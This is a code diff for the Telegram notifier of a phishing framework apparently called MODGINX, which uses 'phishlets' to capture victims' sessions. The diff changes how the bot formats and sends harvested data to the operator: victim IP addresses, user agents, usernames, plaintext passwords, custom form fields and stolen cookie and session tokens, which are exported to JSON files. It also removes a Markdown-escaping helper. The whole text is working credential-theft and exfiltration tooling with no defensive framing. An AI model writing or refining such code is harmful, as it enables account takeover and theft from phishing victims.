@@ -260,34 +260,34 @@ func (t *TelegramBot) hasValidSessionData(session *Session) bool {
 func (t *TelegramBot) formatSessionMessage(session *Session, sessionIndex int, phishletName string) string {
 	var message strings.Builder
 	
-	message.WriteString("🎣 *MODGINX Session Captured*\n\n")
-	message.WriteString(fmt.Sprintf("📊 *Session ID:* %d\n", sessionIndex))
-	message.WriteString(fmt.Sprintf("🎯 *Phishlet:* %s\n", t.escapeMarkdown(phishletName)))
-	message.WriteString(fmt.Sprintf("🌐 *IP Address:* %s\n", t.escapeMarkdown(session.RemoteAddr)))
-	message.WriteString(fmt.Sprintf("🖥️ *User Agent:* %s\n", t.escapeMarkdown(session.UserAgent)))
-	message.WriteString(fmt.Sprintf("⏰ *Time:* %s\n\n", time.Now().Format("2006-01-02 15:04:05")))
+	message.WriteString("🎣 MODGINX Session Captured\n\n")
+	message.WriteString(fmt.Sprintf("📊 Session ID: %d\n", sessionIndex))
+	message.WriteString(fmt.Sprintf("🎯 Phishlet: %s\n", phishletName))
+	message.WriteString(fmt.Sprintf("🌐 IP Address: %s\n", session.RemoteAddr))
+	message.WriteString(fmt.Sprintf("🖥️ User Agent: %s\n", session.UserAgent))
+	message.WriteString(fmt.Sprintf("⏰ Time: %s\n\n", time.Now().Format("2006-01-02 15:04:05")))
 
-	// Add credentials if available
+	// Add credentials if available (but NOT tokens)
 	if session.Username != "" {
-		message.WriteString(fmt.Sprintf("👤 *Username:* %s\n", t.escapeMarkdown(session.Username)))
+		message.WriteString(fmt.Sprintf("👤 Username: %s\n", session.Username))
 	}
 	if session.Password != "" {
-		message.WriteString(fmt.Sprintf("🔑 *Password:* %s\n", t.escapeMarkdown(session.Password)))
+		message.WriteString(fmt.Sprintf("🔑 Password: %s\n", session.Password))
 	}
 
 	// Add custom fields
 	if len(session.Custom) > 0 {
-		message.WriteString("\n📝 *Custom Fields:*\n")
+		message.WriteString("\n📝 Custom Fields:\n")
 		for key, value := range session.Custom {
-			message.WriteString(fmt.Sprintf("  • %s: %s\n", t.escapeMarkdown(key), t.escapeMarkdown(value)))
+			message.WriteString(fmt.Sprintf("  • %s: %s\n", key, value))
 		}
 	}
 
-	// Add token information summary
+	// Only mention token count, tokens will be in JSON file
 	tokenCount := len(session.CookieTokens) + len(session.BodyTokens) + len(session.HttpTokens)
 	if tokenCount > 0 {
-		message.WriteString(fmt.Sprintf("\n🍪 *Auth Tokens:* %d captured\n", tokenCount))
-		message.WriteString("📝 *Note:* Sessions with auth tokens will include downloadable JSON files\n")
+		message.WriteString(fmt.Sprintf("\n🍪 Auth Tokens: %d captured\n", tokenCount))
+		message.WriteString("📁 Tokens available in downloadable JSON file\n")
 	}
 
 	return message.String()
@@ -339,7 +339,7 @@ func (t *TelegramBot) Test() error {
 		return fmt.Errorf("telegram bot token or chat ID not configured")
 	}
 	
-	testMessage := "🧪 *MODGINX Telegram Test*\n\nTelegram notifications are working correctly!"
+	testMessage := "🧪 MODGINX Telegram Test\n\nTelegram notifications are working correctly!"
 	return t.sendMessage(testMessage)
 }
 
@@ -518,54 +518,30 @@ func (t *TelegramBot) createTokensExportFile(session *Session, sessionIndex int,
 	return filePath, nil
 }
 
-// escapeMarkdown escapes special Markdown characters to prevent parsing errors
-func (t *TelegramBot) escapeMarkdown(text string) string {
-	// Escape Markdown special characters
-	replacer := strings.NewReplacer(
-		"*", "\\*",
-		"_", "\\_",
-		"[", "\\[",
-		"]", "\\]",
-		"(", "\\(",
-		")", "\\)",
-		"~", "\\~",
-		"`", "\\`",
-		">", "\\>",
-		"#", "\\#",
-		"+", "\\+",
-		"-", "\\-",
-		"=", "\\=",
-		"|", "\\|",
-		"{", "\\{",
-		"}", "\\}",
-		".", "\\.",
-		"!", "\\!",
-	)
-	return replacer.Replace(text)
-}
+
 
 func (t *TelegramBot) formatSessionCaption(session *Session, sessionIndex int, phishletName string) string {
 	var caption strings.Builder
 	
-	caption.WriteString("🎣 *MODGINX Session Captured*\n\n")
-	caption.WriteString(fmt.Sprintf("📊 *Session ID:* %d\n", sessionIndex))
-	caption.WriteString(fmt.Sprintf("🎯 *Phishlet:* %s\n", t.escapeMarkdown(phishletName)))
-	caption.WriteString(fmt.Sprintf("🌐 *IP Address:* %s\n", t.escapeMarkdown(session.RemoteAddr)))
-	caption.WriteString(fmt.Sprintf("⏰ *Time:* %s\n\n", time.Now().Format("2006-01-02 15:04:05")))
+	caption.WriteString("🎣 MODGINX Session Captured\n\n")
+	caption.WriteString(fmt.Sprintf("📊 Session ID: %d\n", sessionIndex))
+	caption.WriteString(fmt.Sprintf("🎯 Phishlet: %s\n", phishletName))
+	caption.WriteString(fmt.Sprintf("🌐 IP Address: %s\n", session.RemoteAddr))
+	caption.WriteString(fmt.Sprintf("⏰ Time: %s\n\n", time.Now().Format("2006-01-02 15:04:05")))
 	
-	// Add credentials if available
+	// Add credentials if available (but NOT tokens)
 	if session.Username != "" {
-		caption.WriteString(fmt.Sprintf("👤 *Username:* %s\n", t.escapeMarkdown(session.Username)))
+		caption.WriteString(fmt.Sprintf("👤 Username: %s\n", session.Username))
 	}
 	if session.Password != "" {
-		caption.WriteString(fmt.Sprintf("🔑 *Password:* %s\n", t.escapeMarkdown(session.Password)))
+		caption.WriteString(fmt.Sprintf("🔑 Password: %s\n", session.Password))
 	}
 	
-	// Add token count summary
+	// Add token count summary - tokens are in the JSON file only
 	tokenCount := len(session.CookieTokens) + len(session.BodyTokens) + len(session.HttpTokens)
 	if tokenCount > 0 {
-		caption.WriteString(fmt.Sprintf("\n🍪 *Auth Tokens:* %d captured\n", tokenCount))
-		caption.WriteString("📁 *Detailed tokens available in attached JSON file*")
+		caption.WriteString(fmt.Sprintf("\n🍪 Auth Tokens: %d captured\n", tokenCount))
+		caption.WriteString("📁 All tokens available in this JSON file")
 	}
 	
 	return caption.String()
